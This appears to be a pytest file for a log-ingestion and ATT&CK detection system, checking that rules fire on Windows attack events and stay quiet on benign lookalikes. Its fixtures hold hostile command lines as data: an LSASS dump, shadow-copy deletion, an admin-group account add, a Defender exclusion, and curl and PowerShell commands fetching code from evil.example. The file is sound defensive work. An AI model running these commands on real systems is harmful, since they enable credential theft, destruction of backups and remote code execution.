"""Real-world log formats and the rule patterns that came out of testing on public datasets
(Splunk attack_data, EVTX-ATTACK-SAMPLES). Samples are small excerpts in the same shape as the
real captures; the full datasets are exercised by scripts/eval_public_datasets.py."""

import asyncio
import json

from app.agents.ingest_agent import ingest_agent
from app.detection.attack_rules import evaluate_attack_rules

NS = "http://schemas.microsoft.com/win/2004/08/events/event"


def sysmon_xml(event_id, **data):
    items = "".join(f"<Data Name='{k}'>{v}</Data>" for k, v in data.items())
    return (f"<Event xmlns='{NS}'><System><Provider Name='Microsoft-Windows-Sysmon'/><EventID>{event_id}</EventID>"
            f"<TimeCreated SystemTime='2021-03-01T22:52:47.382490200Z'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel>"
            f"<Computer>win-dc</Computer></System><EventData>{items}</EventData></Event>")


def powershell_xml(script):
    return (f"<Event xmlns='{NS}'><System><Provider Name='Microsoft-Windows-PowerShell'/><EventID>4104</EventID>"
            f"<TimeCreated SystemTime='2021-03-01T22:52:47Z'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel>"
            f"<Computer>h</Computer></System><EventData><Data Name='ScriptBlockText'>{script}</Data></EventData></Event>")


def parse(lines):
    return asyncio.run(ingest_agent({"raw_logs": lines, "logs": [], "alerts": [], "agent_execution_log": []}))["logs"]


def fired(lines):
    return {a["technique_id"] for a in evaluate_attack_rules(parse(lines))}


class TestFormats:
    def test_sysmon_event_xml(self):
        (log,) = parse([sysmon_xml(1, Image="C:\\Windows\\System32\\cmd.exe", CommandLine="cmd /c whoami",
                                   ParentImage="C:\\Windows\\explorer.exe", User="CORP\\bob")])
        assert (log.event_id, log.process_name, log.command_line, log.user) == (1, "C:\\Windows\\System32\\cmd.exe", "cmd /c whoami", "CORP\\bob")
        assert log.parent_process_name.endswith("explorer.exe") and log.timestamp.year == 2021

    def test_multiline_windows_event_block(self):
        block = ("04/20/2021 09:08:23 PM\nLogName=Security\nEventCode=4688\nMessage=A new process has been created.\n\n"
                 "Creator Subject:\n\tAccount Name:\t\tbob\n\nProcess Information:\n\tNew Process Name:\tC:\\Windows\\System32\\net1.exe\n"
                 "\tProcess Command Line:\tnet1 localgroup administrators evil /add\n\tCreator Process Name:\tC:\\Windows\\System32\\cmd.exe")
        (log,) = parse([block])
        assert log.event_id == 4688 and "net1 localgroup" in log.command_line and log.timestamp.hour == 21

    def test_winlogbeat_style_json_event(self):
        (log,) = parse([json.dumps({"EventID": 4625, "Channel": "Security", "TargetUserName": "bob", "IpAddress": "10.1.1.1",
                                    "LogonType": "3", "@timestamp": "x"})])
        assert log.auth_result == "failure" and log.source_ip == "10.1.1.1" and log.metadata["logon_type"] == 3


class TestPatternsFoundOnRealData:
    def test_lsass_dump_with_createdump(self):
        assert "T1003.001" in fired([sysmon_xml(1, Image="C:\\Program Files\\PowerShell\\7\\createdump.exe",
                                                CommandLine="createdump.exe -u -f C:\\Temp\\dotnet-lsass.dmp")])

    def test_uac_bypass_registry_key(self):
        assert "T1548.002" in fired([sysmon_xml(13, Image="C:\\Windows\\system32\\reg.exe",
                                                TargetObject="HKU\\S-1-5-21-1-500_Classes\\mscfile\\shell\\open\\command\\(Default)")])

    def test_run_key_under_user_hive(self):
        assert "T1547.001" in fired([sysmon_xml(13, Image="reg.exe",
                                                TargetObject="HKU\\S-1-5-21-1-500\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\evil")])

    def test_rdp_client_launch(self):
        assert "T1021.001" in fired([sysmon_xml(1, Image="C:\\Windows\\System32\\mstsc.exe", CommandLine="mstsc.exe /v:4.44.44.44:3389")])

    def test_shadow_copy_deleted_with_wmic(self):
        assert "T1490" in fired([sysmon_xml(1, Image="wmic.exe", CommandLine="wmic shadowcopy delete")])

    def test_defender_exclusion_in_script_block(self):
        assert "T1562.001" in fired([powershell_xml('Add-MpPreference -ExclusionPath "C:\\Temp"')])

    def test_office_spawning_a_shell_is_phishing_execution(self):
        assert "T1566.001" in fired([sysmon_xml(1, Image="C:\\Windows\\System32\\cmd.exe",
                                                ParentImage="C:\\Program Files\\Microsoft Office\\WINWORD.EXE", CommandLine="cmd /c calc")])

    def test_local_account_or_group_add_with_net1(self):
        assert "T1136.001" in fired([sysmon_xml(1, Image="net1.exe", CommandLine="net1 localgroup administrators atomic /add")])

    def test_admin_share_in_command_line(self):
        assert "T1021.002" in fired([sysmon_xml(1, Image="cmd.exe", CommandLine="cmd.exe /Q /c echo x > \\\\127.0.0.1\\C$\\__output")])

    def test_ordinary_powershell_is_not_a_defender_change(self):
        assert "T1562.001" not in fired([powershell_xml("Get-Process | Select-Object -First 3")])


def test_system_log_cleared_event_104_but_not_other_providers():
    def ev(provider):
        return (f"<Event xmlns='{NS}'><System><Provider Name='{provider}'/><EventID>104</EventID>"
                f"<TimeCreated SystemTime='2021-03-01T22:52:47Z'/><Channel>System</Channel><Computer>h</Computer></System>"
                f"<EventData><Data Name='Channel'>System</Data></EventData></Event>")
    assert "T1070.001" in fired([ev("Microsoft-Windows-Eventlog")])
    assert "T1070.001" not in fired([ev("Microsoft-Windows-TerminalServices-RDPClient")])


def test_rundll32_calling_a_dll_export_by_ordinal():
    assert "T1218.011" in fired([sysmon_xml(1, Image="rundll32.exe", CommandLine="rundll32.exe C:\\Tools\\bin\\All.dll,#2")])


class TestBenignLookalikes:
    """Legitimate use of tools attackers also use must stay quiet (see scripts/eval_false_positives.py)."""

    def test_single_net_user_is_routine_admin_work(self):
        assert "T1087.001" not in fired([sysmon_xml(1, Image="net.exe", CommandLine="net user")])

    def test_curl_to_an_internal_api_is_not_a_tool_download(self):
        assert "T1105" not in fired([sysmon_xml(1, Image="curl.exe", CommandLine="curl.exe https://intranet.corp.local/api/health")])

    def test_curl_saving_a_file_is_a_tool_download(self):
        assert "T1105" in fired([sysmon_xml(1, Image="curl.exe", CommandLine="curl.exe -o payload.exe https://evil.example/p.exe")])

    def test_updater_service_in_program_files_is_not_persistence(self):
        ev = sysmon_xml(0, ImagePath="C:\\Program Files\\Vendor\\svc.exe").replace("Microsoft-Windows-Sysmon", "Service Control Manager").replace("<EventID>0<", "<EventID>7045<")
        assert "T1543.003" not in fired([ev])

    def test_service_running_from_temp_is_persistence(self):
        ev = sysmon_xml(0, ImagePath="C:\\Users\\bob\\AppData\\Local\\Temp\\x.exe").replace("Microsoft-Windows-Sysmon", "Service Control Manager").replace("<EventID>0<", "<EventID>7045<")
        assert "T1543.003" in fired([ev])

    def test_onedrive_run_key_is_not_persistence_but_a_script_is(self):
        ok = sysmon_xml(13, TargetObject="HKU\\S-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive",
                        Details="C:\\Users\\a\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe /background")
        bad = sysmon_xml(13, TargetObject="HKU\\S-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd",
                         Details="powershell -w hidden -c iex(iwr http://evil.example/a)")
        assert "T1547.001" not in fired([ok]) and "T1547.001" in fired([bad])

    def test_windows_event_xml_is_not_mistaken_for_prompt_injection(self):
        from app.agents.detection_agent import detect_rules_only
        assert not any(a.detection_rule == "rule:prompt_injection" for a in detect_rules_only(parse([sysmon_xml(1, Image="a.exe")])))
